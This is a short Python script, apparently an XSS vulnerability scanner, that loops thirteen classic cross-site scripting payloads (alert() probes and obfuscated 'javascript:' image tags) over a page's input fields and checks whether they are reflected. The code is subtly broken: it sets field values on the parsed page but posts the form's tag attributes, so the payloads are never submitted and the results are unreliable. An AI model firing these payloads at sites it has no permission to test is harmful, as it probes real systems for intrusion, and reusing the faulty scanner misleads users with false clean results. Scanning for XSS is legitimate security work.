import requests
from bs4 import BeautifulSoup
import re

def unicorn_crew_scan(url):
    # Send a GET request to the specified URL
    response = requests.get(url)

    # Parse the HTML content of the response
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all input fields in the HTML form
    form_fields = soup.find_all('input')

    # List to store potential XSS vulnerabilities
    xss_vulnerabilities = []

    # Iterate over each input field and inject a malicious payload
    for field in form_fields:
        # Create a payload by injecting a XSS script
        payloads = [
            "<script>alert('XSS Vulnerability Found!');</script>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "<IMG SRC=j&#X41vascript:alert('XSS')>",
            "<IMG SRC=`javascript:alert('XSS')`>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=\"jav	ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
            "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
        ]

        # Iterate over each payload
        for payload in payloads:
            # Replace the field value with the payload
            field['value'] = payload

            # Submit the modified form
            response = requests.post(url, data=soup.form.attrs)

            # Check if the payload appears in the response
            if re.search(re.escape(payload), response.text, re.IGNORECASE):
                xss_vulnerabilities.append({
                    'field_name': field.get('name'),
                    'payload': payload
                })

    # Print the results
    if xss_vulnerabilities:
        print("Potential XSS vulnerabilities found:")
        for vuln in xss_vulnerabilities:
            print("Field Name:", vuln['field_name'])
            print("Payload:", vuln['payload'])
            print("--------------------")
    else:
        print("No potential XSS vulnerabilities found.")

    print("Execution completed.")

# Example usage
unicorn_crew_scan("url")
